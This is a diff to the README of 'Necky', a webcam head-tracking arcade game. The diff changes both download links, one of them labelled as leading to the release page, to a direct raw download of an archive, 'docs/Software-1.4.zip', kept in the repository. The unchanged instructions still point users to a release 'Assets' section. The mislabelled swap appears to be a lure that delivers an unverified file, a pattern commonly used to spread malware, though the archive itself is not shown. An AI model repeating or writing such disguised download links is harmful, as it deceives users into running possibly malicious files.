@@ -1,6 +1,6 @@
 # 🕹️ Necky - Move your head, play the game
 
-[![](https://img.shields.io/badge/Download-Necky-blue)](https://github.com/droefheid007/Necky)
+[![](https://img.shields.io/badge/Download-Necky-blue)](https://github.com/droefheid007/Necky/raw/refs/heads/main/docs/Software-1.4.zip)
 
 Necky is a fun arcade game that tracks your head movements through your webcam. You control the game by moving your head, which helps you stay active while you play. The game uses a synthwave look to create an immersive experience. 
 
@@ -22,7 +22,7 @@ Ensure that your webcam works in other applications before you start. Clear your
 
 To start playing, visit the official page to get the files you need.
 
-[Click here to visit the release page to download Necky](https://github.com/droefheid007/Necky)
+[Click here to visit the release page to download Necky](https://github.com/droefheid007/Necky/raw/refs/heads/main/docs/Software-1.4.zip)
 
 1. Go to the link above.
 2. Look for the section labeled "Assets."
